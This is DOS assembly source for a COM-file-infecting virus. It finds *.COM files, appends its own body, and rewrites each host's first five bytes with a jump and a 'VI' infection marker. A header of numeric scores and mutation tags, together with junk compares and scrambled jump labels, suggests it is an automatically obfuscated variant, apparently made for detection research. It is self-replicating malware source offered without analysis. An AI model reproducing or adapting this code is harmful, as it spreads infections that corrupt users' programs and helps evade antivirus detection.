;1.55749010275
;1.22917191311
;1.4667239143
;1.20959111619
;1.28377861924
;NoMutation
;1.32716453349
;1.1067627822
;1.24193993591
;1.17389838771
;1.15731673625
;		JNZ 	_0
;0.985361342431
;UntouchBlock_0
;1.18863340756
;1.01817028009
;ForcedJMP_0
;1.06026825748
;		JNZ 	_0
;1.04306654313
;0.787489955053
;NoMutation
;0.826485278901
;0.573352773621
;		JNZ 	_0
;0.596691408651
;0.749477788219
;0.633208291019
;ForcedJMP_0
;0.621352414494
;NoMutation
;0.679199510718
;		JZ 	_0
;0.638079213063
;0.255120421734
;UntouchBlock_0
;		JZ 	_0
;		JNZ 	_0
MAIN    SEGMENT BYTE
		ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING
		ORG     100H

HOST:
		jmp     NEAR PTR VIRUS_START   
        db      'VI'
        mov     ah,4CH
        mov     al,0
        int     21H              

VIRUS:   		                 
COMFILE DB      '*.COM',0        

VIRUS_START:
RWRYF:
		call 	 XWXHB
HYMGY:
		call 	 EPIUD
        call    GET_START       

GET_START:
        sub     WORD PTR [VIR_START],OFFSET GET_START - OFFSET VIRUS
        mov     dx,OFFSET DTA   
		cmp 	bx,bx
JNZ XWXHB
JMP RWRYF
XWXHB:
        mov     ah,1AH          
        int     21H        
        call    FIND_FILE       
        jz      N1
        jmp     EXIT_VIRUS      
        N1:
        call    INFECT          
        mov     dx,OFFSET FNAME 
        mov     WORD PTR [HANDLE],24H    
		JMP 	NSTKP
cmp cx,dx
cmp cx,dx
cmp cx,dx
NSTKP:
        mov     ah,9  
		JMP 	HYMGY
EPIUD:
KDRQK:
		call 	 RS_OW
        int     21H             

EXIT_VIRUS:
        mov     dx,80H          
        mov     ah,1AH          
        int     21H             
        mov     bx,[VIR_START]  
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)]  
        mov     WORD PTR [HOST],ax 
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+2]        
        mov     WORD PTR [HOST+2],ax        
        mov     al,BYTE PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+4]        
		cmp 	cx,bx
JZ BOEWC
JMP KDXKO
BOEWC:
		cmp 	bx,bx
JZ ARDQH
JMP RNXA_
ARDQH:
        mov     BYTE PTR [HOST+4],al        
        mov     [VIR_START],100H   
		cmp 	dx,bx
JZ RS_OW
JMP KDRQK
RS_OW:
        ret                     

START_CODE:                     
        nop                     
        nop                     
        nop        
        nop        
        nop             
RNXA_:
KDXKO:
		call 	 BOEWC
		call 	 ARDQH



FIND_FILE:
        mov     dx,[VIR_START]
		JMP 	UAWNR
nop
nop
nop
nop
nop
UAWNR:
        mov     cx,3FH          
		cmp 	dx,dx
JZ VQCXU
JMP TNF__
VQCXU:
        mov     ah,4EH          
        int     21H
TNF__:
		call 	 VQCXU


FF_LOOP:
        or      al,al           
		jnz     N2
        jmp     FF_DONE
        N2:         
		call    FILE_OK         
		jnz     N3
        jmp     FF_DONE         
        N3:
		mov     ah,4FH          
		int     21H             
HWHSD:
		call 	 LWOPP
		jmp     FF_LOOP         

FF_DONE:
BV__U:
		call 	 KBYF_
        ret


FILE_OK:        
        mov     dx,OFFSET FNAME 
        mov     dx,OFFSET FNAME 
		JMP 	HWHSD
LWOPP:
		cmp 	cx,bx
JNZ KBYF_
JMP BV__U
KBYF_:
        mov     ax,3D02H      
        int     21H        
        jnc     N6
        jmp     FOK_NZEND     
    N6:
		JMP 	KIHSM
cmp cx,dx
cmp cx,dx
cmp cx,dx
KIHSM:
        mov     bx,ax         
        push    bx            
        mov     cx,5          
        mov     dx,OFFSET START_IMAGE         
        mov     ah,3FH        
        int     21H        		
        pop     bx            
        mov     ah,3EH        
        int     21H           
        mov     ax,WORD PTR [FSIZE]               
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS 
        jnc     N7
        jmp     FOK_NZEND                         
        N7:
        cmp     BYTE PTR [START_IMAGE],0E9H 
        jz      N4
        jmp FOK_ZEND        
        N4: 
        cmp     WORD PTR [START_IMAGE+3],4956H 
        jz      N5
        jmp     FOK_ZEND           
        N5:


FOK_NZEND:
        mov     al,1          
        or      al,al         
IWHKH:
		call 	 WAATC
        ret

FOK_ZEND:
        xor     al,al         
        ret    
EJBAR:
		call 	 BLYGL
        

INFECT:
        mov     dx,OFFSET FNAME  
        mov     ax,3D02H        
        int     21H        
        mov     WORD PTR [HANDLE],ax            
        xor     cx,cx                       
        mov     dx,cx               
        mov     bx,WORD PTR [HANDLE]        
        mov     ax,4202H                    
        int     21H        
        mov     cx,OFFSET FINAL - OFFSET VIRUS 
        mov     dx,[VIR_START]           
        mov     bx,WORD PTR [HANDLE]                         
		JMP 	IWHKH
WAATC:
		JMP 	NULJF
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
NULJF:
        mov     ah,40H                                      
        int     21H        
        xor     cx,cx           
        mov     dx,WORD PTR [FSIZE]   
        add     dx,OFFSET START_CODE -  OFFSET VIRUS     
        mov     bx,WORD PTR [HANDLE]                         
MHQHQ:
        mov     ax,4200H                               
		cmp 	cx,cx
JNZ BLYGL
JMP EJBAR
BLYGL:
        int     21H        
        mov     cx,5                                    
		JMP 	IFATQ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
IFATQ:
        mov     bx,WORD PTR [HANDLE]                    
        mov     dx,OFFSET START_IMAGE                  
        mov     ah,40H        
        int     21H        
        xor     cx,cx                                 
        mov     dx,cx                             
        mov     bx,WORD PTR [HANDLE]         
		cmp 	ax,cx
JZ INWRL
JMP NQXQM
INWRL:
        mov     ax,4200H                          
        int     21H
        mov     bx,[VIR_START]                    
		JMP 	GKAYD
KFFGU:
        mov     BYTE PTR [START_IMAGE],0E9H     
        mov     ax,WORD PTR [FSIZE]             
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3 
        mov     WORD PTR [START_IMAGE+1],ax        
        mov     WORD PTR [START_IMAGE+3],4956H       
        mov     cx,5   
        mov     dx,OFFSET START_IMAGE      
        mov     bx,WORD PTR [HANDLE]       
        mov     ah,40H                     
        int     21H        
        mov     bx,WORD PTR [HANDLE]       
        mov     ah,3EH                     
		cmp 	ax,bx
JNZ YQLYH
JMP SJHVP
YQLYH:
        int     21H        
NQXQM:
		call 	 INWRL
SJHVP:
		call 	 YQLYH
GKAYD:
		call 	 KFFGU
        ret                                

FINAL:           
ENDVIRUS        EQU     $ + 212    


       ORG     0FF2AH

DTA             DB      1AH dup (?) 
FSIZE           DW      0,0         
FNAME           DB      13 dup (?)  
HANDLE          DW      0           
START_IMAGE     DB      0,0,0,0,0   
VSTACK          DW      50H dup (?) 
VIR_START       DW      (?)         

MAIN    ENDS

        END     HOST                   